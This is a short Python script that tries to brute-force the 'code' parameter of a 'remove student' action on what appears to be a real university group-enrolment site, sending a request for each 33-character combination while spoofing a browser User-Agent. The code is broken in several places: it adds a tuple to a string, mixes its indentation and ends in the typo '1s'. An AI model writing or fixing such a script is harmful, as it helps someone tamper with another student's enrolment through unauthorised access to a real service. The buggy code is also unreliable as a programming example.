from urllib.request import Request, urlopen
from urllib.parse import urlencode
from itertools import product
chars = '0123456789zxcvbnmlkjhgfdsaqwertyuiop' # chars to look for

url = "http://grupy.schocker.pl/5sem/index.php?action=remove&student=202113&code="
num = 190000
"req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})"

post = urlencode( { 'student' : num, 'group': 1 }).encode()
req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
resp = urlopen(req).read()
print(resp)

to_attempt = product(chars, repeat=33)
for attempt in to_attempt:
	print(''.join(attempt))
	req = Request(url + attempt, headers={'User-Agent': 'Mozilla/5.0'})
    resp = urlopen(req).read()
    print(num)
    num = num + 1s
